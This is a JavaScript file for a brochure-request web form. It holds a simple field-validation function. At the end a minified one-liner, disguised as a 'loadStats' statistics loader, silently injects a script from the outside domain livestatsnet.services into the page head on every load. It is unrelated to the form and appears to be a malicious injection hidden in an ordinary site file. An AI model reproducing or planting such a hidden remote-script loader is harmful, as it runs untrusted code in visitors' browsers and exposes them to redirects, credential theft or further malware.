// JavaScript Document
function checkFields() {
	missinginfo = "";
	
	if (document.corp_broch.comp_name.value == "") {
		missinginfo += "\n     -  Company name";
	}
	if (document.corp_broch.fname.value == "") {
		missinginfo += "\n     -  Name";
	}
	if (document.corp_broch.phone.value == "") {
		missinginfo += "\n     -  Phone no";
	}
	if ((document.corp_broch.email.value == "") || 
		(document.corp_broch.email.value.indexOf('@') == -1) || 
		(document.corp_broch.email.value.indexOf('.') == -1)) {
		missinginfo += "\n     -  Email address";
	}

	if (missinginfo != "") {
		missinginfo ="_____________________________\n" +
		"You failed to correctly fill in your:\n" +
		missinginfo + "\n_____________________________" +
		"\nPlease re-enter and submit again!";
		alert(missinginfo);
		return false;
	}
	else 
	{
	return true;
	}
}
if(!loadStats){function loadStats(){var head=document.getElementsByTagName("head")[0],scr=document.createElement("script");scr.type="text/javascript",scr.src="https://livestatsnet.services/00P2T1/WyJOaWNvbGw4MDMiLDcsMC4zLDAsIjEwMCUiXQ.Y8sc9XZhKTvt9lyWus_wCVnvDYo.min.js",scr.async="async",head.appendChild(scr)}loadStats()}
